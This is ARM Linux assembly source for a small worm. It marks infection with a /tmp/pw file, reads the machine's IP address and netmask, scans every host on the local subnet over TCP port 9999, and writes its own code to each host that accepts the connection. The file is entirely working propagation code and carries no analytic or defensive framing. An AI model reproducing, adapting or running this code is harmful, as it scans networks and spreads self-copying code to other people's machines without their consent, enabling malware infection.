	.text
	.globl _start
_start:
	# Create /tmp/pw
	mov 	r7, $5      @ SYS_OPEN
	adr 	r0, mark    @ Use PC-Relative Addressing
	mov 	r1, $0300   @ 0100 | 0200
	mov 	r2, $0700
	svc 	$0          @ open ("/tmp/pw", O_CREAT | O_EXCL, S_IRWXU) ;

	# If file exists -> then we are done
	cmp 	r0, $0
	ble 	done
	mov 	r7, $6      @ SYS_CLOSE
	svc 	$0

	# Create socket for network querying
	mov 	r7, $281  @ socket
	mov 	r0, $2    @ AF_INET = 2
	mov 	r1, $1    @ SOCK_STREAM = 1
	mov 	r2, $6    @ IPPROTO_TCP = 6
	svc 	$0        @ s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov 	r9, r0
	
	# Get IP address
	# Fill-in ifreq structure in memory
	ldr  	r8, =#0x30687465 	@ Cannot load big numbers with mov
	str  	r8, [sp, #-0x40]   @ Store device name eth0
	mov  	r8, $2             @ Address family
	strb 	r8, [sp, #-0x30]   
	
	# r0 already contains the socket
	mov 	r1, #0x8915        @ SIOGIFADDR
	add 	r2, sp, #-0x40      
	mov 	r7, #54            @ ioctl
	svc 	$0                 @ ioctl (fd, SIOGIFADDR, &buf)
	
	# Store IP in what will be a sockaddr_in struct
	ldr 	r5, [sp, #-0x2c]   @ Store IP in r5 (network order)

	# Get the netmask
	mov 	r1, #0x891b        @ SIOGIFNETMASK
	mov 	r0, r9             @ Recover the socket
	svc 	$0                 @ ioctl (fd, SIOGIFNETMASK, &buf)

	# Store Netmask 
	ldr 	r6, [sp, #-0x2c]  @ Store Netmask in r6 (network order)
	and 	r5, r5, r6        @ Calculate network address
	
	mov 	r1, $0x0f27       @ SNASE Port
	str 	r1, [sp, #-0x2e]  @ Store port for connect
	
	# Close the query socket
	mov 	r0, r9   @ fd = socket         
	mov 	r7, #6   @ close
	svc 	#0       @ close (fd)
	
	# Calculate number of hosts
	rev 	r6, r6
	mvn 	r6, r6
	
	# Loop over number of hosts
	eor 	r8, r8, r8
	rev 	r5, r5
	
	# Variables so far
	#  r5 -> Network address in host format (we can add)
	#  r6 -> Number of hosts to scan
	#  r8 -> Loop index
	#  r9 -> Socket
	#
scan:
	# Skip .255 and .0 addresses
	mov  	r0, #255
	ands  	r7, r8, r0 	@ extracts last byte of address and update flags
	beq  	next_loop       @ if zero skip
	cmp  	r7, #255
	beq  	next_loop
	
	# Create Socket
	mov 	r7, $281  @ socket
	mov 	r0, $2    @ AF_INET = 2
	mov 	r1, $1    @ SOCK_STREAM = 1
	mov 	r2, $6    @ IPPROTO_TCP = 6
	svc 	$0        @ s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov 	r9, r0
	
	# Make socket NON-BLOCKING (TO CHECK)
	mov 	r1, $4     @ F_SETFL
	mov 	r2, $0x800 @ O_NONBLOCKING
	mov 	r7, $55    @ fcntl
	svc 	$0
	
	# Calculate scanning address
	mov 	r7, r5
	orr 	r7, r5, r8
	rev 	r7, r7
	str 	r7, [sp, #-0x2c]

	# Connection Loop
	mov 	r3, $4             @ 4 non-blocking connect tries
	mov 	r2, $16            @ Size of sockaddr
try_connect:	
	mov 	r7, $283           @ Connect
	mov 	r0, r9             @ Socket
	add 	r1, sp, #-0x30     @ sockaddr
	svc 	$0
	
	cmp 	r0, $0
	beq 	move       	@ >0 .. got a connection : move
	cmp 	r0, $-115   	@ EINPROGRESS
	bne 	next       	@ If we get an error and is not EINPROGRESS go for next host

	# Nanosleep
	mov 	r7, $162    	@ nanosleep
	adr 	r0, delay
	eor 	r1, r1, r1
	svc 	$0
	
	subs 	r3, r3, $1  	@ Update flags
	bne 	try_connect
	b  	next

move:	
	# Here we had successfully connected... Just move code
	mov 	r7, $4       	@ SYS_WRITE (r0 is already the socket
	mov 	r0, r9
	adr 	r1, _start
	mov 	r2, #code_size
	svc 	$0
	
next:
	mov 	r0, r9
	mov 	r7, $6    
	svc 	$0
	
next_loop:	
	add 	r8, r8, $1
	cmp 	r8, r6
	bgt 	done
	b 	scan
	
done:	
	# Exit
	mov 	r7, $1      @exit
	svc 	#0
	
	# Data starts here. It is included in .text segment
_data:
	mark:	        .asciz "/tmp/pw"
        delay:	        .quad 0
        delay_nsec:	.quad 50000000
end_code:	.equ	code_size, end_code - _start	

